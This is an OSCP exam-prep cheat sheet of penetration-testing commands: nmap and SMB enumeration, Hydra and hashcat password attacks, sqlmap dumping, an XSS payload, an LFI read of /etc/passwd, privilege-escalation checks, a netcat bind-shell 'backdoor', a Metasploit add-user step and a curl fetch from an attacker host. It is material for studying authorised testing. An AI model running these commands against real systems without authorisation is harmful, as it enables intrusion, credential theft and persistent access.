# OSCP-Exam-NotesOSCP Preparation Repository

This repository is organized into sections for quick access to commands, methodologies, and common exploits relevant to OSCP preparation.

1. Enumeration

1.1 Network Scanning

Nmap Commands

Full TCP port scan:

nmap -p- -T4 -v <target>

Service and version detection:

nmap -sV -sC -p<ports> <target>

UDP scan:

nmap -sU -p<ports> <target>

Output to file:

nmap -oN scan_results.txt <target>

Netcat

Banner grabbing:

nc -nv <target> <port>

Masscan

Fast port scanning:

masscan <target> -p1-65535 --rate=1000

1.2 Service Enumeration

SMB

Enumerate shares:

smbclient -L //<target> -U ""

Connect to a share:

smbclient //<target>/<share> -U <user>

Enum4linux:

enum4linux <target>

FTP

Anonymous login:

ftp <target>

HTTP

Directory brute-forcing:

gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt

Nikto scan:

nikto -h http://<target>/

SNMP

Enumerate SNMP:

snmpwalk -v 2c -c public <target>

2. Exploitation

2.1 Password Attacks

Hydra

SSH brute-force:

hydra -l <user> -P <wordlist> ssh://<target>

HTTP POST brute-force:

hydra -l <user> -P <wordlist> -f -s <port> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

John the Ripper

Cracking hashes:

john --wordlist=<wordlist> <hash_file>

Showing cracked passwords:

john --show <hash_file>

Hashcat

Cracking example MD5 hashes:

hashcat -m 0 -a 0 <hash_file> <wordlist>

2.2 Web Exploitation

SQLMap

Basic SQL injection:

sqlmap -u "http://<target>/page?id=1" --dbs

Extract tables:

sqlmap -u "http://<target>/page?id=1" -D <database> --tables

Dump data:

sqlmap -u "http://<target>/page?id=1" -D <database> -T <table> --dump

XSS

Basic payload:

<script>alert('XSS');</script>

LFI

Access passwd file:

http://<target>/?file=../../../../../etc/passwd

2.3 Privilege Escalation

Linux

SUID Binaries:

find / -perm -4000 2>/dev/null

Writable files:

find / -writable -type f 2>/dev/null

Check kernel exploits:

uname -a
searchsploit <kernel_version>

Windows

Identify vulnerable services:

wmic service get name,displayname,pathname,startmode | findstr "Auto" | findstr /i /v "C:\Windows\\"

Check for unquoted service paths:

wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"

3. Post-Exploitation

3.1 Maintaining Access

Netcat

Persistent backdoor:

nc -lvnp <port> -e /bin/bash

Metasploit

Add user:

run post/windows/manage/add_user

3.2 Data Exfiltration

Download files with curl:

curl -O http://<attacker_ip>:<port>/<file>

4. Tools and Wordlists

4.1 Tools

Impacket: SMB enumeration and exploitation.

Metasploit: Exploitation framework.

LinPEAS: Linux privilege escalation enumeration.

WinPEAS: Windows privilege escalation enumeration.

4.2 Wordlists

RockYou: /usr/share/wordlists/rockyou.txt

SecLists: /usr/share/seclists/-Prep
